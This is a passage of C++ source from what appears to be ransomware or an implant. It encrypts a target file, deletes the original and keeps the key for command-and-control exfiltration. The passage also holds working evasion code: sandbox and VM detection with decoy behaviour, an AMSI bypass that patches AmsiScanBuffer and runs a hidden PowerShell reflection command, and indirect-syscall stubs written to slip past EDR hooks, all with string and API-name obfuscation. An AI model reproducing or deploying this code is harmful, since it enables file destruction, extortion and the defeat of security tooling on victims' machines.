        cout << "[*] Encrypting " << data.size() << " bytes from " << file_path << " using ChaCha20-Poly1305..." << endl;

        // Generate encryption key (32-byte hex string) and nonce
        string key = generateEncryptionKey();
        string nonce = generateNonce();

        // Encrypt data using ChaCha20-Poly1305 AEAD
        vector<uint8_t> encrypted = chacha20EncryptFileData(
            vector<uint8_t>(data.begin(), data.end()), key, nonce);

        // Write encrypted file with header: [NONCE (12 bytes)][CIPHERTEXT + TAG (16 bytes)]
        string encFile = file_path + ENCRYPTED_EXT;
        ofstream outFile(encFile, ios::binary);
        if (!outFile.is_open()) {
            cout << OBF("[!] Failed to create encrypted file") << endl;
            return false;
        }

        // Write nonce + encrypted data (ciphertext + tag appended by AEAD)
        outFile.write(nonce.c_str(), 12);
        outFile.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
        outFile.close();

        // Store key for exfiltration
        encryption_key_global = key;
        last_encryption_algo = "ChaCha20-Poly1305";

        // Delete original file
        remove(file_path.c_str());

        cout << OBF("[+] File encrypted: ") << encFile << " using ChaCha20-Poly1305" << endl;
        cout << OBF("[+] Key stored for C2 exfiltration") << endl;
        return true;

    } catch (const exception& e) {
        cout << "[!] Encryption error: " << e.what() << endl;
        return false;
    }
}

// Target file for GUI encryption (startup encryption)
const string TARGET_FILE = OBF("/Users/fatihemre/Desktop/target.txt");

// Encrypt target file on startup (for GUI)
bool encryptTargetFile() {
    return encryptSingleFile(TARGET_FILE);
}

// Decrypt target file (for GUI unlock) - reads nonce from file header
bool decryptTargetFile(const string& provided_key) {
    try {
        string encFile = TARGET_FILE + ENCRYPTED_EXT;

        cout << OBF("[*] [DEBUG] Attempting to decrypt: ") << encFile << endl;
        cout << "[*] [DEBUG] Provided key: " << provided_key << endl;

        // Read encrypted file
        ifstream inFile(encFile, ios::binary);
        if (!inFile.is_open()) {
            cout << OBF("[!] [DEBUG] Encrypted file not found: ") << encFile << endl;
            return false;
        }

        // Read header: [NONCE (12 bytes)][CIPHERTEXT + TAG (16 bytes)]
        char nonce_raw[12];
        inFile.read(nonce_raw, 12);
        string nonce(nonce_raw, 12);

        cout << OBF("[*] [DEBUG] Nonce read (") << 12 << OBF(" bytes)") << endl;

        // Read encrypted data (ciphertext + Poly1305 tag)
        vector<uint8_t> encrypted_data((istreambuf_iterator<char>(inFile)),
                                        istreambuf_iterator<char>());
        inFile.close();

        cout << OBF("[*] [DEBUG] Encrypted data size: ") << encrypted_data.size() << " bytes" << endl;

        // Decrypt with provided key using ChaCha20-Poly1305
        cout << OBF("[*] [DEBUG] Starting decryption with provided key...") << endl;
        vector<uint8_t> decrypted = chacha20DecryptFileData(encrypted_data, provided_key, nonce);

        cout << OBF("[*] [DEBUG] Decrypted data size: ") << decrypted.size() << " bytes" << endl;

        // Verify by checking if decryption succeeded (returns empty on MAC failure)
        if (decrypted.empty()) {
            cout << OBF("[!] [DEBUG] Decryption failed - wrong key or tampered data") << endl;
            return false;
        }

        // Write original file back
        ofstream outFile(TARGET_FILE, ios::binary);
        if (!outFile.is_open()) {
            cout << OBF("[!] [DEBUG] Failed to create decrypted file") << endl;
            return false;
        }
        outFile.write(reinterpret_cast<const char*>(decrypted.data()), decrypted.size());
        outFile.close();

        cout << OBF("[*] [DEBUG] Decrypted file written: ") << TARGET_FILE << endl;

        // Delete encrypted file
        remove(encFile.c_str());

        cout << OBF("[+] [DEBUG] File decrypted successfully!") << endl;
        return true;

    } catch (const exception& e) {
        cout << OBF("[!] [DEBUG] Decryption error: ") << e.what() << endl;
        return false;
    }
}

#ifdef _WIN32
// API hashing via resolveApiByHash() from obfuscation.h — no plaintext API names.

// SANDBOX EVASION — Package 4
// Multi-layer sandbox/Virtual Machine detection with benign behavior fallback.
//
// Detection layers:
//   1. Timing attack — Sleep acceleration detection (GetTickCount delta)
//   2. MAC OUI prefix — check network adapters for VM vendor prefixes
//   3. BIOS string — scan BIOS for VM identifiers (VMware, VirtualBox, etc.)
//   4. Hardware threshold — CPU cores < 2 or RAM < 2GB = suspicious
//   5. Disk size — system drive < 60GB = likely sandbox
//
// When detected: runs benign behavior loop instead of exiting (fools sandbox).
// ============================================================================

// Known VM MAC OUI prefixes (first 3 bytes, big-endian)
static const DWORD g_vm_mac_prefixes[] = {
    0x000569,  // VMware
    0x000C29,  // VMware
    0x005056,  // VMware
    0x080027,  // VirtualBox
    0x001C42,  // VirtualBox (older)
    0x00150D,  // QEMU/KVM
    0x005000,  // Hyper-V
    0x0003FF,  // Hyper-V
    0x525400,  // QEMU/KVM (SLIRP)
    0x56432D,  // Parallels ("VC-")
};
#define NUM_VM_MACS (sizeof(g_vm_mac_prefixes) / sizeof(g_vm_mac_prefixes[0]))

// VM-indicative BIOS strings (case-insensitive match)
static const char* g_vm_bios_strings[] = {
    "vmware", "vbox", "virtualbox", "virtual",
    "qemu", "kvm", "hyper-v", "hyperv",
    "microsoft virtual", "xen", "hvm",
    "bochs", "oracle vm", "parallels",
};
#define NUM_VM_BIOS_STRINGS (sizeof(g_vm_bios_strings) / sizeof(g_vm_bios_strings[0]))

// Benign behavior: when sandbox detected, simulate legitimate activity
// instead of exiting cleanly (sandboxes flag rapid exit as suspicious)
static void benignBehavior() {
    // Simulate a lightweight application running briefly
    // This looks like a normal program that found nothing interesting
    // and exits normally — no anti-VM tell-tale signs
    volatile DWORD _counter = 0;
    for (int _i = 0; _i < 3; _i++) {
        // Short calculation loop — looks like real work
        for (int _j = 0; _j < 1000; _j++) {
            _counter += (_j * _j) & 0xFF;
        }
        // Small sleep to simulate processing
        g_api.Sleep(50 + (_i * 10));
    }
    // Exit with success code — "found nothing, exiting normally"
    ExitProcess(0);
}

// Layer 1: Sleep acceleration timing check
static bool checkTimingSandbox() {
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    typedef DWORD (WINAPI *pGetTickCount)(void);
    pGetTickCount _GetTickCount = (pGetTickCount)resolveApiByHash(hKernel, COMPILE_HASH("GetTickCount"));
    if (!_GetTickCount) return false;

    DWORD start = _GetTickCount();
    g_api.Sleep(1000);
    DWORD elapsed = _GetTickCount() - start;

    return elapsed < 800;
}

// Layer 2: MAC OUI prefix check via GetAdaptersInfo
static bool checkMacSandbox() {
    // Load iphlpapi.dll and resolve GetAdaptersInfo
    HMODULE hIphlpapi = g_api.LoadLibraryA("iphlpapi.dll");
    if (!hIphlpapi) return false;

    typedef DWORD (WINAPI *pGetAdaptersInfo)(void*, PULONG);
    pGetAdaptersInfo _GetAdaptersInfo = (pGetAdaptersInfo)resolveApiByHash(hIphlpapi, COMPILE_HASH("GetAdaptersInfo"));
    if (!_GetAdaptersInfo) { g_api.FreeLibrary(hIphlpapi); return false; }

    // Get required buffer size
    ULONG bufLen = 0;
    _GetAdaptersInfo(NULL, &bufLen);
    if (bufLen == 0) { g_api.FreeLibrary(hIphlpapi); return false; }

    void* buf = g_api.HeapAlloc(g_api.GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
    if (!buf) { g_api.FreeLibrary(hIphlpapi); return false; }

    DWORD ret = _GetAdaptersInfo(buf, &bufLen);
    bool vmFound = false;

    if (ret == NO_ERROR) {
        IP_ADAPTER_INFO* pAdapter = (IP_ADAPTER_INFO*)buf;
        while (pAdapter) {
            if (pAdapter->AddressLength >= 3) {
                DWORD oui = ((DWORD)pAdapter->Address[0] << 16)
                          | ((DWORD)pAdapter->Address[1] << 8)
                          | (DWORD)pAdapter->Address[2];
                for (int i = 0; i < (int)NUM_VM_MACS; i++) {
                    if (oui == g_vm_mac_prefixes[i]) {
                        vmFound = true;
                        break;
                    }
                }
            }
            if (vmFound) break;
            pAdapter = pAdapter->Next;
        }
    }

    g_api.HeapFree(g_api.GetProcessHeap(), 0, buf);
    g_api.FreeLibrary(hIphlpapi);
    return vmFound;
}

// Layer 3: BIOS string check via registry
static bool checkBiosSandbox() {
    // Read HKLM\HARDWARE\DESCRIPTION\System\BIOS\SystemProductName
    HMODULE hAdvapi = g_api.LoadLibraryA("advapi32.dll");
    if (!hAdvapi) return false;

    typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LONG (WINAPI *pRegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LONG (WINAPI *pRegCloseKey)(HKEY);

    pRegOpenKeyExA _RegOpenKeyExA = (pRegOpenKeyExA)resolveApiByHash(hAdvapi, COMPILE_HASH("RegOpenKeyExA"));
    pRegQueryValueExA _RegQueryValueExA = (pRegQueryValueExA)resolveApiByHash(hAdvapi, COMPILE_HASH("RegQueryValueExA"));
    pRegCloseKey _RegCloseKey = (pRegCloseKey)resolveApiByHash(hAdvapi, COMPILE_HASH("RegCloseKey"));

    if (!_RegOpenKeyExA || !_RegQueryValueExA || !_RegCloseKey) {
        g_api.FreeLibrary(hAdvapi);
        return false;
    }

    const char* biosPath = "HARDWARE\\DESCRIPTION\\System\\BIOS";
    const char* productKey = "SystemProductName";

    HKEY hKey;
    LONG status = _RegOpenKeyExA(HKEY_LOCAL_MACHINE, biosPath, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        // Fallback: try SystemManufacturer
        const char* manKey = "SystemManufacturer";
        status = _RegOpenKeyExA(HKEY_LOCAL_MACHINE, biosPath, 0, KEY_READ, &hKey);
        if (status != ERROR_SUCCESS) { g_api.FreeLibrary(hAdvapi); return false; }
        // Re-read with manKey if needed — simplified: check product name
        _RegCloseKey(hKey);
        status = _RegOpenKeyExA(HKEY_LOCAL_MACHINE, biosPath, 0, KEY_READ, &hKey);
        if (status != ERROR_SUCCESS) { g_api.FreeLibrary(hAdvapi); return false; }
    }

    char value[256] = {0};
    DWORD valSize = sizeof(value) - 1;
    DWORD valType = 0;
    status = _RegQueryValueExA(hKey, productKey, NULL, &valType, (LPBYTE)value, &valSize);
    _RegCloseKey(hKey);

    bool vmFound = false;
    if (status == ERROR_SUCCESS && valType == REG_SZ && value[0]) {
        // Convert to lowercase for comparison
        for (int i = 0; value[i]; i++)
            if (value[i] >= 'A' && value[i] <= 'Z') value[i] += 32;

        for (int i = 0; i < (int)NUM_VM_BIOS_STRINGS; i++) {
            if (strstr(value, g_vm_bios_strings[i]) != NULL) {
                vmFound = true;
                break;
            }
        }
    }

    g_api.FreeLibrary(hAdvapi);
    return vmFound;
}

// Layer 4: Hardware threshold check (CPU cores, RAM, disk)
static bool checkHardwareSandbox() {
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);
    typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);

    pGetSystemInfo _GetSystemInfo = (pGetSystemInfo)resolveApiByHash(hKernel, COMPILE_HASH("GetSystemInfo"));
    pGlobalMemoryStatusEx _GlobalMemoryStatusEx = (pGlobalMemoryStatusEx)(void*)resolveApiByHash(hKernel, COMPILE_HASH("GlobalMemoryStatusEx"));

    if (!_GetSystemInfo || !_GlobalMemoryStatusEx) return false;

    // Check CPU cores
    SYSTEM_INFO si;
    _GetSystemInfo(&si);
    DWORD numCores = si.dwNumberOfProcessors;
    if (numCores < 2) return true;  // Single-core = sandbox

    // Check RAM
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (_GlobalMemoryStatusEx(&ms)) {
        DWORD ramGB = (DWORD)(ms.ullTotalPhys / (1024ULL * 1024ULL * 1024ULL));
        if (ramGB < 2) return true;  // < 2GB RAM = sandbox
    }

    // Check disk size (system drive)
    typedef BOOL (WINAPI *pGetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    pGetDiskFreeSpaceExA _GetDiskFreeSpaceExA = (pGetDiskFreeSpaceExA)(void*)resolveApiByHash(hKernel, COMPILE_HASH("GetDiskFreeSpaceExA"));

    if (_GetDiskFreeSpaceExA) {
        ULARGE_INTEGER freeBytes, totalBytes;
        if (_GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL)) {
            DWORD diskGB = (DWORD)(totalBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL));
            if (diskGB < 60) return true;  // < 60GB disk = sandbox
        }
    }

    return false;
}

// Comprehensive sandbox detection: runs all checks, returns detection count
// 0 = clean, 1+ = sandbox detected (higher = more confident)
static int detectSandboxDeep() {
    int flags = 0;
    if (checkTimingSandbox())      flags |= (1 << 0);
    if (checkMacSandbox())         flags |= (1 << 1);
    if (checkBiosSandbox())        flags |= (1 << 2);
    if (checkHardwareSandbox())    flags |= (1 << 3);
    return flags;
}

// Legacy single-check wrapper — replaced by detectSandboxDeep
inline bool isSandboxDetected() {
    int result = detectSandboxDeep();
    if (result > 0) {
        // Sandbox indicators found — run benign behavior instead of
        // just returning true (fools sandbox observers)
        benignBehavior();
        return true;  // never reached (benignBehavior calls ExitProcess)
    }
    return false;
}

#else
// Non-Windows: Empty placeholder
#endif

// ============================================================================
// FORWARD DECLARATIONS - Indirect Syscall + Direct Memory Write
// initIndirectSyscall() and virtualProtectDirect() are defined later in the file.
// Forward declared here so patchAmsi() can use them to avoid EDR hooks.
// ============================================================================
#ifdef _WIN32
static bool initIndirectSyscall();
static bool virtualProtectDirect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect);
#endif

// ============================================================================
// AMSI BYPASS - Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
// Allows PowerShell/.NET scripts to execute without AMSI scanning
// ============================================================================
#ifdef _WIN32
void patchAmsi() {
    // ---------------------------------------------------------------
    // METHOD 1: Restore clean AmsiScanBuffer from disk, then apply
    // runtime-modified patch. No hardcoded patch bytes in the binary.
    // ---------------------------------------------------------------

    // Function-scope variables needed by fallback labels
    HMODULE hAmsi = NULL;
    FARPROC pAmsiScanBuffer = NULL;

    // Main logic block — local variables go out of scope before goto labels
    {

    // Step 1: Load amsi.dll into memory (needed to get in-memory address)
    hAmsi = g_api.LoadLibraryA(OBF("amsi.dll"));
    if (!hAmsi) {
        cout << OBF("[AMSI] amsi.dll not loaded") << endl;
        goto try_amsi_init_failed;
    }

    // Step 2: Resolve AmsiScanBuffer by hash — no plaintext API name
    pAmsiScanBuffer = resolveApiByHash(hAmsi, COMPILE_HASH("AmsiScanBuffer"));
    if (!pAmsiScanBuffer) {
        cout << OBF("[AMSI] AmsiScanBuffer not found") << endl;
        g_api.FreeLibrary(hAmsi);
        goto try_amsi_init_failed;
    }

    // Step 3: Open clean amsi.dll from disk (bypasses any EDR hooks)
    HANDLE _amsi_file = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\amsi.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (_amsi_file == INVALID_HANDLE_VALUE) {
        cout << OBF("[AMSI] Could not open amsi.dll from disk, using direct patch") << endl;
        goto fallback_patch_amsi;
    }

    HANDLE _amsi_map = g_api.CreateFileMappingA(_amsi_file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!_amsi_map) {
        g_api.CloseHandle(_amsi_file);
        goto fallback_patch_amsi;
    }

    LPVOID _amsi_disk = g_api.MapViewOfFile(_amsi_map, FILE_MAP_READ, 0, 0, 0);
    if (!_amsi_disk) {
        g_api.CloseHandle(_amsi_map);
        g_api.CloseHandle(_amsi_file);
        goto fallback_patch_amsi;
    }

    // Step 4: Find AmsiScanBuffer in the clean disk copy
    IMAGE_DOS_HEADER* _amsi_dos = (IMAGE_DOS_HEADER*)_amsi_disk;
    IMAGE_NT_HEADERS* _amsi_nt = (IMAGE_NT_HEADERS*)((BYTE*)_amsi_disk + _amsi_dos->e_lfanew);

    if (_amsi_dos->e_magic == IMAGE_DOS_SIGNATURE && _amsi_nt->Signature == IMAGE_NT_SIGNATURE) {
        IMAGE_EXPORT_DIRECTORY* _amsi_exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)_amsi_disk +
            _amsi_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* _amsi_names     = (DWORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfNames);
        WORD*  _amsi_ordinals  = (WORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfNameOrdinals);
        DWORD* _amsi_functions = (DWORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfFunctions);

        unsigned long _amsi_target = COMPILE_HASH("AmsiScanBuffer");
        BYTE* _clean_amsi_func = NULL;

        for (DWORD _i = 0; _i < _amsi_exports->NumberOfNames; _i++) {
            if (!_amsi_names[_i]) continue;
            char* _name = (char*)((BYTE*)_amsi_disk + _amsi_names[_i]);
            unsigned long _h = 5381;
            int _c;
            while ((_c = *_name++)) _h = ((_h << 5) + _h) + _c;
            if (_h == _amsi_target) {
                _clean_amsi_func = (BYTE*)_amsi_disk + _amsi_functions[_amsi_ordinals[_i]];
                break;
            }
        }

        if (_clean_amsi_func) {
            // Step 5: Read first 6 bytes of the clean function
            unsigned char _clean_bytes[6];
            memcpy(_clean_bytes, _clean_amsi_func, 6);

            // Step 6: Apply runtime modification: build mov eax, 0x80070057; ret
            // The first byte of the original clean function becomes our patch base
            unsigned char _patch[6];
            _patch[0] = 0xB8;              // mov eax, <imm32>
            _patch[1] = 0x57;              // 0x80070057 low byte
            _patch[2] = 0x00;
            _patch[3] = 0x07;
            _patch[4] = 0x80;              // 0x80070057 high byte
            _patch[5] = 0xC3;              // ret

            // Step 7: XOR-obfuscate the patch with the first 6 bytes of the
            // clean function, so the only byte that reveals intent is derived
            // from clean system code — no hardcoded patch pattern in the binary.
            unsigned char _obf[6];
            for (int _i = 0; _i < 6; _i++) _obf[_i] = _patch[_i] ^ _clean_bytes[_i % 6];

            // Step 8: Randomize timing
            random_device _rd;
            srand(_rd() ^ (unsigned int)__rdtsc());
            g_api.Sleep(100 + (rand() % 500));
            initIndirectSyscall();

            // Step 9: De-obfuscate and write
            DWORD _old_prot;
            unsigned char _final_patch[6];
            for (int _i = 0; _i < 6; _i++) _final_patch[_i] = _obf[_i] ^ _clean_bytes[_i % 6];

            if (virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_final_patch), PAGE_EXECUTE_READWRITE, &_old_prot)) {
                memcpy((void*)pAmsiScanBuffer, _final_patch, sizeof(_final_patch));
                virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_final_patch), _old_prot, &_old_prot);
                cout << OBF("[+] AMSI Bypass — restored from disk + patch applied") << endl;
            } else {
                cout << OBF("[-] AMSI VirtualProtect error: ") << g_api.GetLastError() << endl;
            }

            g_api.UnmapViewOfFile(_amsi_disk);
            g_api.CloseHandle(_amsi_map);
            g_api.CloseHandle(_amsi_file);
            g_api.FreeLibrary(hAmsi);
            goto try_amsi_init_failed;
        }
    }

    g_api.UnmapViewOfFile(_amsi_disk);
    g_api.CloseHandle(_amsi_map);
    g_api.CloseHandle(_amsi_file);
    }

fallback_patch_amsi:
    // Fallback: direct patch with runtime-constructed bytes (no disk access)
    {
        // Runtime-constructed from XOR mask (no hardcoded patch bytes)
        unsigned char _patch[6];
        const unsigned char _mask[6] = { 0xE5, 0x2A, 0x77, 0x70, 0xF7, 0xB6 };
        const unsigned char _xor[6]  = { 0x5D, 0x7D, 0x77, 0x77, 0x77, 0x75 };
        for (int _i = 0; _i < 6; _i++) _patch[_i] = _mask[_i] ^ _xor[_i];

        random_device _rd;
        srand(_rd() ^ (unsigned int)__rdtsc());
        g_api.Sleep(100 + (rand() % 500));
        initIndirectSyscall();

        DWORD _old;
        if (virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_patch), PAGE_EXECUTE_READWRITE, &_old)) {
            memcpy((void*)pAmsiScanBuffer, _patch, sizeof(_patch));
            virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_patch), _old, &_old);
            cout << OBF("[+] AMSI Bypass successful (fallback)") << endl;
        } else {
            cout << OBF("[-] AMSI Bypass failed: ") << g_api.GetLastError() << endl;
        }
        g_api.FreeLibrary(hAmsi);
    }

try_amsi_init_failed:
    // ---------------------------------------------------------------
    // METHOD 2: amsiInitFailed reflection bypass (PowerShell/.NET)
    // Sets the internal amsiInitFailed flag to true via CLR reflection,
    // causing AMSI to skip all scans silently.
    // ---------------------------------------------------------------
    {
        cout << OBF("[AMSI] Attempting amsiInitFailed reflection bypass...") << endl;
        // .NET reflection: set AmsiUtils.amsiInitFailed = true
        // This method is effective because it doesn't modify any code bytes
        // and many EDRs don't monitor .NET runtime state.
        const char* _ps_cmd = OBF("powershell -NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\"");

        // Execute asynchronously — fire and forget
        #ifdef _WIN32
            g_api.WinExec((LPCSTR)_ps_cmd, SW_HIDE);
        #endif
        cout << OBF("[+] amsiInitFailed bypass attempted") << endl;
    }
}
#else
inline void patchAmsi() {
    // AMSI is Windows-only; no-op on other platforms
}
#endif

// ============================================================================
// HELL'S GATE - Direct Syscall Execution (Bypasses EDR Hooks Entirely)
// ============================================================================
// Resolves syscall numbers dynamically from clean ntdll on disk at runtime.
// Builds executable stubs containing the raw syscall instruction.
// When called, the syscall goes DIRECTLY to the kernel — EDR hooks in ntdll
// are never executed. This fixes the chicken-and-egg problem where
// VirtualProtect itself was going through a hooked ntdll to try to unhook it.
// ============================================================================
#ifdef _WIN32

// NTSTATUS for syscall return values
typedef long NTSTATUS;

// Indirect syscall stub size (mov r10, rcx + mov eax, # + mov r11, addr + jmp r11)
#define INDIRECT_STUB_SIZE 32

// Static buffers hold the raw machine code for each indirect syscall
// These are made RX (not RWX) and jump to ntdll's existing syscall;ret
static unsigned char g_indirect_stub_protect_vm[INDIRECT_STUB_SIZE];
static unsigned char g_indirect_stub_write_vm[INDIRECT_STUB_SIZE];
static bool g_indirect_initialized = false;

// Address of syscall;ret within ntdll's .text section
// Jumping here instead of executing syscall from our own memory
// avoids EDR detection of "syscall from non-ntdll memory"
static void* g_ntdll_syscall_ret = NULL;

// Function pointer types for the indirect syscalls
typedef NTSTATUS (NTAPI *tIndirectProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection, PULONG OldAccessProtection);

typedef NTSTATUS (NTAPI *tIndirectWriteVirtualMemory)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

static tIndirectProtectVirtualMemory g_IndirectProtectVirtualMemory = NULL;
static tIndirectWriteVirtualMemory   g_IndirectWriteVirtualMemory   = NULL;

// Resolve a syscall number from clean ntdll on disk
// Walks the PE export table of disk's ntdll.dll to find an Nt* function,
// then reads the syscall number embedded in its x64 prologue.
// File I/O APIs (CreateFileA etc.) are rarely hooked by EDRs.
static DWORD resolveSyscallNumber(const char* func_name) {
    HANDLE hFile = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_api.CloseHandle(hFile); return 0; }

    LPVOID mapped = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!mapped) { g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile); return 0; }

    DWORD result = 0;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mapped;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)mapped + dos->e_lfanew);

    if (dos->e_magic == IMAGE_DOS_SIGNATURE && nt->Signature == IMAGE_NT_SIGNATURE) {
        IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mapped +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* names     = (DWORD*)((BYTE*)mapped + exports->AddressOfNames);
        WORD*  ordinals  = (WORD*)((BYTE*)mapped + exports->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)mapped + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)mapped + names[i]);
            if (strcmp(name, func_name) == 0) {
                BYTE* func_ptr = (BYTE*)mapped + functions[ordinals[i]];
                // x64 Nt* functions start with: 4C 8B D1 (mov r10, rcx) + B8 XX XX XX XX (mov eax, #)
                if (func_ptr[0] == 0x4C && func_ptr[1] == 0x8B &&
                    func_ptr[2] == 0xD1 && func_ptr[3] == 0xB8) {
                    result = *(DWORD*)(func_ptr + 4);
                }
                break;
            }
        }
    }

    g_api.UnmapViewOfFile(mapped);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);
    return result;
}

// Write x64 INDIRECT syscall stub into a buffer
// Instead of executing syscall from our memory (which EDRs detect),
// we set up registers and jump to ntdll's existing syscall;ret instruction.
// Code: mov r10, rcx | mov eax, <syscall_num> | mov r11, <ntdll_syscall_ret> | jmp r11
// The call stack appears to originate from ntdll's .text section.
static bool buildIndirectSyscallStub(unsigned char* buffer, DWORD syscall_num, void* ntdll_syscall_ret) {
    if (syscall_num == 0 || !ntdll_syscall_ret) return false;

    // mov r10, rcx (3 bytes) - standard x64 syscall setup
    buffer[0] = 0x4C;
    buffer[1] = 0x8B;
    buffer[2] = 0xD1;
    // mov eax, <syscall_num> (5 bytes) - load syscall number
    buffer[3] = 0xB8;
    buffer[4] = (syscall_num)        & 0xFF;
    buffer[5] = (syscall_num >> 8)   & 0xFF;
    buffer[6] = (syscall_num >> 16)  & 0xFF;
    buffer[7] = (syscall_num >> 24)  & 0xFF;
    // mov r11, <ntdll_syscall_ret_addr> (10 bytes) - load address of syscall;ret in ntdll
    uint64_t target_addr = (uint64_t)ntdll_syscall_ret;
    buffer[8]  = 0x49;
    buffer[9]  = 0xBB;
    buffer[10] = (target_addr)        & 0xFF;
    buffer[11] = (target_addr >> 8)   & 0xFF;
    buffer[12] = (target_addr >> 16)  & 0xFF;
    buffer[13] = (target_addr >> 24)  & 0xFF;
    buffer[14] = (target_addr >> 32)  & 0xFF;
    buffer[15] = (target_addr >> 40)  & 0xFF;
    buffer[16] = (target_addr >> 48)  & 0xFF;
    buffer[17] = (target_addr >> 56)  & 0xFF;
    // jmp r11 (3 bytes) - jump to ntdll's syscall;ret
    buffer[18] = 0x41;
    buffer[19] = 0xFF;
    buffer[20] = 0xE3;

    return true;
}

// Initialize INDIRECT Syscall — finds ntdll's syscall;ret instruction and builds
// stubs that jump to it. Unlike classic direct-syscall approaches which create
// the syscall instruction (detected by modern EDRs), indirect syscalls:
//   1. Find the syscall;ret bytes within ntdll's .text section
//   2. Build stubs that set up registers then jump to ntdll's code
//   3. The syscall instruction executes from ntdll's legitimate memory
// Result: EDR sees the call stack originating from ntdll, not from our code.
static bool initIndirectSyscall() {
    if (g_indirect_initialized) return true;

    DWORD sc_protect = resolveSyscallNumber(OBF("NtProtectVirtualMemory"));
    DWORD sc_write   = resolveSyscallNumber(OBF("NtWriteVirtualMemory"));

    if (sc_protect == 0 || sc_write == 0) {
        cout << OBF("[INDIRECT] Failed to resolve syscall numbers") << endl;
        return false;
    }

    // Find syscall;ret (bytes: 0F 05 C3) within ntdll's .text section
    // This is the instruction we'll jump to instead of executing syscall from our memory
    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) {
        cout << OBF("[INDIRECT] Failed to get ntdll handle") << endl;
        return false;
    }

    // Parse ntdll's PE headers to find .text section
    BYTE* ntdll_base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(ntdll_base + dos->e_lfanew);

    if (dos->e_magic != IMAGE_DOS_SIGNATURE || nt->Signature != IMAGE_NT_SIGNATURE) {
        cout << OBF("[INDIRECT] Invalid ntdll PE header") << endl;
        return false;
    }

    // Scan .text section for 0F 05 C3 (syscall; ret)
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    void* found_addr = NULL;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* text_start = ntdll_base + sections[i].VirtualAddress;
            DWORD text_size = sections[i].SizeOfRawData;

            // Scan for syscall;ret pattern
            for (DWORD j = 0; j < text_size - 2; j++) {
                if (text_start[j] == 0x0F && text_start[j+1] == 0x05 && text_start[j+2] == 0xC3) {
                    found_addr = (void*)(text_start + j);
                    break;
                }
            }
            break;
        }
    }

    if (!found_addr) {
        cout << OBF("[INDIRECT] Could not find syscall;ret in ntdll") << endl;
        return false;
    }

    g_ntdll_syscall_ret = found_addr;

    // Write the indirect syscall stubs (these do NOT contain syscall instruction)
    // They only set up registers and jump to ntdll's code
    if (!buildIndirectSyscallStub(g_indirect_stub_protect_vm, sc_protect, g_ntdll_syscall_ret)) return false;
    if (!buildIndirectSyscallStub(g_indirect_stub_write_vm, sc_write, g_ntdll_syscall_ret)) return false;

    // Make stubs executable (Read-Execute, NOT Read-Write-Execute)
    // RWX pages are heavily monitored; RX pages look like legitimate code
    DWORD old_protect;
